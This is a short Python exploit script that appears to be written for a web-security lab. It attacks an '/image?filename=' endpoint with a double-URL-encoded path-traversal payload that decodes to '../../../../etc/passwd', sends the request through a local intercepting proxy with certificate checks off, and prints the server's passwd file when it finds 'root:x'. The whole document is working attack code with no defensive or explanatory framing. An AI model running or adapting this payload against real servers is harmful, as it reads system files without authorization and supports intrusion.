import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def directory_travwersal_exploit(url):
    path = url + "/image?filename=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34"
    re = requests.get(path, verify=False, proxies=proxies)
    if 'root:x' in re.text:
        print("(+) Explopit Successful....")
        print("\n(+) The following is the content of the /etc/passwd file: ")
        print(re.text)
    else:
        print('(+) Exploit unsuccessfull....')
        sys.exit(-1)
def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1]
    print("(+) Exploiting directory traversal......")

    directory_travwersal_exploit(url)

if __name__ == "__main__":
    main()